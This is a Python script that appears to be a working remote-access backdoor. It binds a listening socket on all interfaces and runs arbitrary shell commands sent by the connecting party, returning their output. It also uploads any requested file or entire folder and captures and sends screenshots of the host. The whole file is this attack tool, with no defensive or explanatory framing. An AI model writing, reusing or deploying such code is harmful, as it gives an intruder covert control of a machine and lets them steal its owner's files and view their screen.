import os
import socket
import subprocess
import pyautogui # for screenshot

HOST = '0.0.0.0'
PORT = 12345
BUFFER_SIZE = 8192

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    print(f"[+] Listening on {HOST}:{PORT}")
    conn, addr = s.accept()
    print(f"[+] Connected to {addr}")

    with conn:
        current_dir = os.getcwd()  # Track the directory in variable

        while True:
            data = conn.recv(8192)
            if not data:
                break
            
            cmd = data.decode().strip()
####################################################################################### 
            if cmd.lower() == 'file':                                                  #file section

                filepath = conn.recv(8192).decode()

                if not os.path.exists(filepath):
                    print("File not found.")
                    exit()

                filename = os.path.basename(filepath)
                filesize = os.path.getsize(filepath)

                print(f"Sending file: {filename}")

                conn.sendall(filename.encode())
                conn.sendall(str(filesize).encode())

                with open(filepath, "rb") as f:
                    while True:
                        data = f.read(8192)
                        if not data:
                            break
                        conn.sendall(data)

                print("File sent successfully.")
######################################################################################
            elif cmd.lower() == 'folder':                                             #folder section

                folder_path = conn.recv(8192).decode()

                if not os.path.isdir(folder_path):
                    print("Folder does not exist!")
                    conn.close()
                    exit()

                for root, dirs, files in os.walk(folder_path):
                    for file in files:
                        filepath = os.path.join(root, file)
                        relative_path = os.path.relpath(filepath, folder_path)
                        filesize = os.path.getsize(filepath)

                        print(f"Sending file: {relative_path}")

                        conn.sendall(relative_path.encode())
                        conn.recv(8192)  # Wait for ACK

                        conn.sendall(str(filesize).encode())
                        conn.recv(8192)  # Wait for ACK

                        with open(filepath, "rb") as f:
                            while True:
                                data = f.read(8192)
                                if not data:
                                    break
                                conn.sendall(data)
                
                conn.sendall("DONE".encode())
####################################################################################
            elif cmd.lower() == 'ss':                                              #screenshot
                screenshot = pyautogui.screenshot()
                screenshot.save("screenshot.png")

                curr = os.getcwd()
                screen = "screenshot.png"
                filepath = os.path.join(curr,screen)
                
                if not os.path.exists(filepath):
                    print("File not found.")
                    exit()

                filename = os.path.basename(filepath)
                filesize = os.path.getsize(filepath)

                print(f"Sending file: {filename}")

                conn.sendall(filename.encode())
                conn.sendall(str(filesize).encode())

                with open(filepath, "rb") as f:
                    while True:
                        data = f.read(8192)
                        if not data:
                            break
                        conn.sendall(data)

                print("Screenshot sent.")
                
                if os.path.exists(filepath):
                    os.remove(filepath)
####################################################################################
            elif cmd.lower() == 'help_me':                                          #handling error
                continue
####################################################################################
            else:                                                                   #normal section
                if cmd.startswith("cd "):
                    path = cmd[3:].strip()
                    try:
                        os.chdir(path)
                        current_dir = os.getcwd()
                        conn.sendall(f"[+] Moved to {current_dir}".encode())
                    except Exception as e:
                        conn.sendall(f"[!] Failed to cd: {e}".encode())
                else:
                    result = subprocess.run(cmd, shell=True, cwd=current_dir,capture_output=True, text=True)
                    output = result.stdout or result.stderr or "move on"
                    conn.sendall(output.encode())
        
        conn.close()
